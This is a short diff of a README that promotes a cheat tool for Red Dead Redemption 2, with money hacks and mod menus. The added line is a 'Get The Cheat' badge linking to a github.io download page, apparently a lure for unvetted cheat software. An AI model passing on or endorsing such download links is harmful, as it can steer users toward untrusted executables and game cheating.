@@ -4,7 +4,7 @@
 
 Red Dead Redemption 2 is one of the most immersive open-world games ever made. But let’s face it, grinding for cash, ammo, or legendary gear can take forever. That’s why many players look for a **RDR 2 cheat** – from money hacks to full-blown mod menus – to unlock fun features and skip the boring grind.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://rdr-2-cheat.github.io/.github/)
 ---
 
 ## What Is an RDR 2 Cheat?
